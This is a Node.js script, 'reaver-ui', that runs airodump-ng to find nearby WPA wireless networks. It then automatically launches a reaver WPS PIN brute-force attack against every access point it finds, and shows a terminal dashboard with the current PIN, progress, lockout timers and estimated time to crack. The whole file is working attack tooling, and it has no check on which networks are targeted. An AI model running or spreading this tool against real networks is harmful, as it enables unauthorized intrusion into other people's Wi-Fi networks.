#!/usr/bin/env node

var Legobox = require("legobox"),
    stream = require("stream"),
    spawn = require("child_process").spawn;

if (process.argv.length < 4) {
  console.warn("Usage: reaver-ui <interface> <channel>");
  process.exit(1);
}

var interface = process.argv[2],
    channel = process.argv[3];

var LineSplitter = function LineSplitter(options) {
  options = options || {};

  options.objectMode = true;
  options.highWaterMark = options.highWaterMark || 1;

  stream.Transform.call(this, options);

  this.buffer = "";
};
LineSplitter.prototype = Object.create(stream.Transform.prototype);

LineSplitter.prototype._transform = function _transform(input, encoding, done) {
  this.buffer += Buffer(input, encoding).toString();

  var lines = this.buffer.split(/[\r\n]+/);

  this.buffer = lines.pop();

  lines.forEach(function(line) {
    this.push(line);
  }.bind(this));

  return done();
};

var Reaver = function Reaver(options) {
  options = options || {};

  options.objectMode = true;
  options.highWaterMark = options.highWaterMark || 1;

  stream.Writable.call(this, options);

  options.args = options.args || [];
  var args = options.args.reduce(function(i, v) {
    for (var k in v) {
      i.push(k);

      if (v[k] !== null) {
        i.push(v[k]);
      }
    }

    return i;
  }, []);

  this.process = spawn("reaver", args);

  this.process.stdout.pipe(new LineSplitter()).pipe(this);
  this.process.stderr.pipe(new LineSplitter()).pipe(this);
};
Reaver.prototype = Object.create(stream.Writable.prototype);

Reaver.prototype._write = function _write(input, encoding, done) {
  this.emit("line", input);

  var matches;

  if (matches = input.match(/Associated with .+? \(ESSID: (.+)\)/)) {
    this.emit("associated");
    this.emit("essid", matches[1]);
  }

  if (matches = input.match(/Trying pin ([0-9]+)/)) {
    this.emit("trying", matches[1]);
  }

  if (matches = input.match(/([0-9]+) seconds\/pin/)) {
    this.emit("speed", parseInt(matches[1]));
  }

  if (matches = input.match(/([0-9\.]+)% complete/)) {
    this.emit("percent", parseFloat(matches[1]));
  }

  if (matches = input.match(/waiting ([0-9]+) seconds before/)) {
    this.emit("waiting", parseInt(matches[1]));
  }

  return done();
};

var container = new Legobox.Container({
  width: process.stdout.columns,
  height: process.stdout.rows,
  split: Legobox.Container.SPLIT.vertical,
});

container.pipe(process.stdout);

container.clear().hide();

var current_time = new Legobox.Text({content: "", align: "center"});
setInterval(function() {
  current_time.content = (new Date()).toISOString();
  current_time.reflow();
}, 1000);
container.addWidget(current_time, {height: 2});

var addTarget = function addTarget(target) {
  var outer = new Legobox.Container({split: Legobox.Container.SPLIT.vertical}, {height: 2});

  var info_container = new Legobox.Container({split: Legobox.Container.SPLIT.horizontal}, {height: 1});

  var bssid_label = new Legobox.Text({content: target, align: "left"}),
      current_label = new Legobox.Text({content: "", align: "left"}),
      locked_label = new Legobox.Text({content: "[  ]", align: "left"}),
      finish_label = new Legobox.Text({content: "                        ", align: "left"}),
      essid_label = new Legobox.Text({content: "()", align: "left"});

  info_container.addWidget(bssid_label, {width: 18}).addWidget(current_label, {width: 9}).addWidget(locked_label, {width: 5}).addWidget(finish_label, {width: 25}).addWidget(essid_label);
  outer.addWidget(info_container);

  var progress_container = new Legobox.Container({split: Legobox.Container.SPLIT.horizontal}, {height: 1});

  var progress_label = new Legobox.Text({content: "", align: "right"}),
      progress_bar = new Legobox.Progress({total: 100, align: "left"});

  progress_label.content = "0%";
  progress_bar.progress = 0;

  progress_container.addWidget(progress_bar).addWidget(progress_label, {width: 7});
  outer.addWidget(progress_container);

  var lines = [];
  var text = new Legobox.Text({content: "", align: "left"});

  var reaver = new Reaver({
    args: [
      {
        "-vv": null,
        "-i": interface,
        "-c": channel,
        "-b": target,
      },
    ],
  });

  reaver.once("essid", function() {
    container.addWidget(outer, {height: 2});
    container.reflow();
  });

  reaver.on("line", function(line) {
    lines.push(line);
    if (lines.length > 3) {
      lines.shift();
    }
    text.content = lines.join("\n");
    text.reflow();
  });

  var speed = 0;
  reaver.on("speed", function(e) {
    speed = e;
  });

  reaver.on("essid", function(essid) {
    essid_label.content = "(" + essid + ")";
    essid_label.reflow();
  });

  reaver.on("percent", function(percent) {
    progress_label.content = percent.toString() + "%";
    progress_label.reflow();

    progress_bar.progress = Math.round(percent);
    progress_bar.reflow();

    if (speed !== 0) {
      finish_label.content = (new Date(Date.now() + (speed * 100 * (100 - percent) * 1000))).toISOString();
      finish_label.reflow();
    }
  });

  reaver.on("waiting", function(time) {
    var when = new Date(Date.now() + time * 1000);

    var update = function() {
      locked_label.content = "[" + Math.floor((when.valueOf() - Date.now()) / 1000) + "]";
      locked_label.reflow();
    };

    var iv = setInterval(update, 1000);

    setTimeout(function() {
      clearInterval(iv);

      locked_label.content = "[  ]";
      locked_label.reflow();
    }, time * 1000);
  });

  reaver.on("trying", function(key) {
    current_label.content = key.toString();
    current_label.reflow();
  });
};

// fire up airodump to look for new targets

function extractInformation() {
  var s = new stream.Transform({objectMode: true});

  s.cache = {};

  s._transform = function _transform(input, encoding, done) {
    var matches = Buffer(input, encoding).toString().match(/([0-9A-F:]+)\s+([0-9\-]+)\s+([0-9\-]+)\s+([0-9\-]+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(.+?)\s+(WPA.+?)\s+(.+?)\s+(.+?)\s+/);

    if (matches) {
      var d = {
        bssid: matches[1],
        power: parseInt(matches[2], 10),
        rxq: parseInt(matches[3], 10),
        beacons: parseInt(matches[4], 10),
        data: parseInt(matches[5], 10),
        channel: parseInt(matches[7], 10),
        speed: parseInt(matches[8], 10),
        encryption: matches[9],
        cipher: matches[10],
        auth: matches[11],
      };

      if (!this.cache[d.bssid] || d.beacons !== this.cache[d.bssid].beacons || d.data !== this.cache[d.bssid].data) {
        this.push(d);
      }

      this.cache[d.bssid] = d;
    }

    return done();
  };

  return s;
}

var ad = spawn("airodump-ng", ["-c", channel, interface]);

var targets = {};
ad.stderr.pipe(new LineSplitter()).pipe(extractInformation()).on("readable", function() {
  var record;
  while (record = this.read()) {
    if (!targets[record.bssid]) {
      targets[record.bssid] = true;
      addTarget(record.bssid);
    }
  }
});

// force initial (re)flow
container.reflow();
container.reflow();

// make sure we reflow when we need to
process.stdout.on("resize", function() {
  container.width = process.stdout.columns;
  container.height = process.stdout.rows;
  container.clear().reflow();
});

// this just stops the app from closing right away
process.stdin.resume();
